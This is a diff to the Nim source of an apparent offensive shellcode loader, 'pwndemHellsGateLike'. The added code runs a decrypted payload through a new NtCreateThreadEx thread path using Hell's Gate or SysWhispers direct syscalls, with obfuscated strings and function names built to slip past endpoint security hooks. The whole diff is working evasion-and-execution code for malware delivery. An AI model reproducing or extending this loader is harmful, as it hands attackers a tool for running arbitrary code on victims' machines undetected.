@@ -54,6 +54,12 @@ proc pwndemHellsGateLike[byte](friendlycode: openarray[byte]): void =
 
             success = GetSyscallStub("NtAllocateVirtualMemory", cast[LPVOID](syscallStub_NtAlloc))
             success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
+            when defined(LocalCreateThread):
+                var syscallStub_NtCreate: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE)
+                # define NtCreateThreadEx
+                let NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreate))
+                VirtualProtect(cast[LPVOID](syscallStub_NtCreate), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
+                success = GetSyscallStub("NtCreateThreadEx", cast[LPVOID](syscallStub_NtCreate))
         
 
         when defined(Hellsgate):
@@ -95,9 +101,40 @@ proc pwndemHellsGateLike[byte](friendlycode: openarray[byte]): void =
         else:
             echo obf("[+] NtWriteVirtualMemory - wrote bytes ") & fmt"{bytesWritten}"
                 
-            
-        let f = cast[proc(){.nimcall.}](buffer)
-        f()
+        when defined(LocalCreateThread):
+            var tHandle: HANDLE
+            when defined(SysWhispers):
+                status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,pHandle,buffer,NULL, FALSE, 0, 0, 0, NULL)
+                NtWaitForSingleObject(tHandle, 0, nil)
+                status = zuatzuastdiasyy(tHandle)
+                status = zuatzuastdiasyy(pHandle)
+                echo obf("[*] NtCreateThreadEx: "), toHex(status)
+            else:    
+                when defined(Hellsgate):
+                    if getSyscall(ntCreateTable):
+                        syscall = ntCreateTable.wSysCall
+                    else:
+                        echo obf("[-] Failed to find opcode for NtCreateThreadEx")
+                status = NtCreateThreadEx(
+                &tHandle, 
+                THREAD_ALL_ACCESS, 
+                nil, 
+                -1,
+                buffer, 
+                nil, FALSE, 0, 0, 0, nil)
+                echo obf("[*] NtCreateThreadEx: "), toHex(status)
+                NtWaitForSingleObject(tHandle, 0, nil)
+            when defined(Hellsgate):
+                when defined(Hellsgate):
+                    if getSyscall(ntCloseTable):
+                        syscall = ntCloseTable.wSysCall
+                    else:
+                        echo obf("[-] Failed to find opcode for NtClose")
+            status = NtClose(tHandle)
+            status = NtClose(pHandle)
+        else:
+            let f = cast[proc(){.nimcall.}](buffer)
+            f()
 
 when isMainModule:
      pwndemHellsGateLike(dectext)
